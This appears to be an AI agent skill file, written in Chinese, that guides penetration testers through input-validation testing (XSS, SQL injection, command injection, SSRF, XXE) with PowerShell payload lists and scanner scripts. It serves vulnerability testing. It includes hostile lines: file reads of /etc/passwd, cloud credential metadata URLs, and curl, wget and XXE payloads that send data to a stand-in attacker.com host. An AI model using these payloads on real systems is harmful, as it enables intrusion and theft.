---
name: injection-testing
description: 输入验证测试阶段详细指南 (WSTG-INPV) - 包含 XSS、SQL注入、命令注入、SSRF、XXE
---

# Phase 6: 输入验证测试 (WSTG-INPV) ⭐ 核心测试

这是渗透测试中最关键的阶段，检测所有注入类漏洞。

## 测试目标

1. 检测反射型/存储型 XSS
2. 检测 SQL 注入
3. 检测命令注入
4. 检测 SSRF（服务端请求伪造）
5. 检测 XXE（外部实体注入）
6. 检测文件上传漏洞

---

## 6.1 XSS 测试 (跨站脚本攻击)

### 测试原理

XSS 漏洞允许攻击者在受害者浏览器中执行恶意脚本。

### Payload 库

```powershell
$xssPayloads = @(
    # 基础 Payload
    '<script>alert(1)</script>',
    '<script>alert("XSS")</script>',
    '<script>alert(document.cookie)</script>',
    
    # 事件处理
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<marquee onstart=alert(1)>',
    
    # 属性注入
    '" onmouseover="alert(1)"',
    "' onmouseover='alert(1)'",
    '"><script>alert(1)</script>',
    "';alert(1)//",
    
    # 编码绕过
    '<script>eval(atob("YWxlcnQoMSk="))</script>',
    '<img src=x onerror="&#97;lert(1)">',
    '<svg/onload=alert(1)>',
    
    # DOM 型
    'javascript:alert(1)',
    '<a href="javascript:alert(1)">click</a>',
    
    # WAF 绕过
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<img src="x" onerror="&#97;lert&#40;1&#41;">',
    '<svg><script>alert(1)</script></svg>'
)
```

### 测试参数

```powershell
# 常见可注入参数
$xssParams = @(
    "q", "search", "query", "keyword",
    "name", "input", "text", "value",
    "comment", "message", "desc", "title",
    "redirect", "url", "callback", "return"
)

# 测试 URL 路径
$xssPaths = @(
    "/",
    "/search",
    "/results",
    "/error",
    "/404"
)
```

### 测试脚本

```powershell
function Test-XSS {
    param(
        [string]$TargetUrl,
        [string[]]$Payloads,
        [string[]]$Params
    )
    
    $results = @()
    
    foreach ($path in $xssPaths) {
        foreach ($param in $Params) {
            foreach ($payload in $Payloads) {
                $testUrl = "$TargetUrl$path`?$param=$([System.Uri]::EscapeDataString($payload))"
                
                try {
                    $resp = Invoke-WebRequest -Uri $testUrl -UseBasicParsing -ErrorAction SilentlyContinue
                    
                    # 检查 payload 是否被反射
                    if ($resp.Content -match [regex]::Escape($payload)) {
                        $results += [PSCustomObject]@{
                            Type = "Reflected XSS"
                            Location = "$path`?$param"
                            Payload = $payload
                            Risk = "HIGH"
                        }
                        Write-Host "[!] XSS Found: $path`?$param"
                        break  # 找到一个即可
                    }
                } catch { }
            }
        }
    }
    
    return $results
}
```

### 记录要点

- **位置**: 哪个参数存在漏洞
- **Payload**: 使用的有效载荷
- **证据**: 响应中包含未编码的 payload
- **影响**: 可窃取 Cookie、会话劫持

---

## 6.2 SQL 注入测试

### 测试原理

SQL 注入允许攻击者操纵数据库查询，可能导致数据泄露或数据库被控制。

### Payload 库

```powershell
$sqlPayloads = @(
    # 错误检测
    "'",
    "''",
    "`",
    "\\",
    "%00",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' /*",
    "admin'--",
    "admin' #",
    "admin'/*",
    
    # UNION 注入
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    
    # 布尔盲注
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1' AND 'a'='a",
    "1' AND 'a'='b",
    
    # 时间盲注
    "1' AND SLEEP(5)--",
    "1' AND BENCHMARK(10000000,SHA1('test'))--",
    "1'; WAITFOR DELAY '0:0:5'--",
    
    # 信息提取
    "' UNION SELECT version()--",
    "' UNION SELECT database()--",
    "' UNION SELECT user()--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    
    # 绕过过滤
    "1' /*!50000OR*/ 1=1--",
    "1' OR 1=1 LIMIT 1--",
    "1' GROUP BY columnnames HAVING 1=1--"
)
```

### 错误模式

```powershell
$errorPatterns = @(
    # MySQL
    "SQL syntax.*MySQL",
    "Warning.*mysql_",
    "MySqlException",
    "valid MySQL result",
    
    # PostgreSQL
    "PostgreSQL.*ERROR",
    "Warning.*\Wpg_",
    "valid PostgreSQL result",
    "Npgsql\.",
    
    # SQL Server
    "Driver.*SQL[\-\_\ ]*Server",
    "OLE DB.*SQL Server",
    "\bSQL Server[^&lt;&quot;]+Driver",
    "Warning.*mssql_",
    "\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
    "System\.Data\.SqlClient\.",
    "Exception.*\bSystem\.Data\.SqlClient\.",
    
    # Oracle
    "\bORA-[0-9][0-9][0-9][0-9]",
    "Oracle error",
    "Oracle.*Driver",
    "Warning.*oci_",
    "Warning.*ora_",
    
    # SQLite
    "SQLite/JDBCDriver",
    "SQLite\.Exception",
    "System\.Data\.SQLite\.SQLiteException",
    "Warning.*sqlite_",
    "Warning.*SQLite3::",
    "\[SQLITE_ERROR\]",
    
    # 通用
    "SQL syntax",
    "SQL error",
    "syntax error",
    "unexpected end of SQL",
    "Unclosed quotation mark",
    "Invalid column name"
)
```

### 测试脚本

```powershell
function Test-SQLInjection {
    param(
        [string]$TargetUrl,
        [string[]]$Payloads,
        [string[]]$Params
    )
    
    $results = @()
    
    foreach ($param in $Params) {
        foreach ($payload in $Payloads) {
            $testUrl = "$TargetUrl`?$param=$([System.Uri]::EscapeDataString($payload))"
            
            try {
                $resp = Invoke-WebRequest -Uri $testUrl -UseBasicParsing -ErrorAction SilentlyContinue
                
                # 检查错误模式
                foreach ($pattern in $errorPatterns) {
                    if ($resp.Content -match $pattern) {
                        $results += [PSCustomObject]@{
                            Type = "SQL Injection"
                            Location = $param
                            Payload = $payload
                            Error = $pattern
                            Risk = "CRITICAL"
                        }
                        Write-Host "[!] SQLi Found: $param with $payload"
                        break
                    }
                }
            } catch { }
        }
    }
    
    return $results
}
```

---

## 6.3 命令注入测试

### 测试原理

命令注入允许攻击者在服务器上执行任意系统命令。

### Payload 库

```powershell
$cmdPayloads = @(
    # Unix
    "; ls",
    "| ls",
    "$(ls)",
    "`ls`",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; id",
    "| id",
    "; whoami",
    "| whoami",
    
    # Windows
    "& dir",
    "| dir",
    "& type C:\Windows\System32\drivers\etc\hosts",
    "| type C:\Windows\System32\drivers\etc\hosts",
    
    # 时间盲注
    "; sleep 5",
    "| sleep 5",
    "; ping -c 5 127.0.0.1",
    "| ping -n 5 127.0.0.1",
    
    # 带外数据
    "; nslookup attacker.com",
    "| nslookup attacker.com",
    "; curl http://attacker.com",
    "| wget http://attacker.com"
)
```

### 检测模式

```powershell
$cmdIndicators = @(
    # Unix 输出
    "root:",
    "uid=",
    "gid=",
    "/bin/bash",
    "/bin/sh",
    "drwxr-xr-x",
    "bin",
    "etc",
    "usr",
    
    # Windows 输出
    "Volume in drive",
    "Directory of",
    "hosts",
    
    # 时间延迟
    # (通过响应时间判断)
)
```

---

## 6.4 SSRF 测试

### 测试原理

SSRF 允许攻击者让服务器发起请求到内部网络或其他服务。

### Payload 库

```powershell
$ssrfPayloads = @(
    # 本地服务
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://0x7f000001",
    "http://0177.0.0.1",
    
    # 云元数据
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    
    # 内网常见服务
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://192.168.1.1",
    "http://192.168.0.1",
    
    # 协议探测
    "file:///etc/passwd",
    "file:///C:/Windows/System32/drivers/etc/hosts",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_info",
    
    # 特殊端口
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:27017"
)
```

### 检测模式

```powershell
$ssrfIndicators = @(
    # 云元数据
    "ami-id",
    "instance-id",
    "instance-type",
    "local-hostname",
    "public-hostname",
    
    # /etc/passwd
    "root:",
    "/bin/bash",
    
    # Redis
    "redis_version",
    
    # MySQL
    "mysql",
    
    # 服务错误
    "Connection refused",
    "ECONNREFUSED",
    "No route to host"
)
```

---

## 6.5 XXE 测试

### 测试原理

XXE 允许攻击者通过 XML 输入读取服务器文件或发起 SSRF。

### Payload 库

```powershell
$xxePayloads = @(
    # 基础 XXE
    '<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <root>&xxe;</root>',
    
    # Blind XXE
    '<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "http://attacker.com/?data=%file;">
    ]>
    <root>&xxe;</root>',
    
    # 带外数据
    '<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [
        <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
        %dtd;
    ]>
    <root>test</root>'
)
```

---

## 攻击验证

发现漏洞后，执行攻击验证：

```powershell
# 验证 XSS
$verifyXss = '<script>document.title="XSS_VERIFIED"</script>'
# 发送后检查页面标题是否改变

# 验证 SQL 注入
$verifySqli = "' UNION SELECT 1,2,3--"
# 发送后检查是否返回额外数据

# 验证命令注入
$verifyCmd = '; echo PENTEST_VERIFIED'
# 发送后检查响应是否包含验证字符串

# 验证路径遍历
$verifyTraversal = '../../../etc/passwd'
# 发送后检查是否读取到文件内容
```

---

## 输出格式

```
## 🔍 输入验证测试结果

### XSS 漏洞
| 位置 | Payload | 风险 |
|------|---------|------|
| /search?q | <script>alert(1)</script> | HIGH |

### SQL 注入
| 位置 | Payload | 风险 |
|------|---------|------|
| /item?id | ' OR '1'='1 | CRITICAL |

### 命令注入
| 位置 | Payload | 风险 |
|------|---------|------|
| /ping?host | ; ls | CRITICAL |

### SSRF
| 位置 | Payload | 风险 |
|------|---------|------|
| /fetch?url | http://127.0.0.1 | CRITICAL |
```
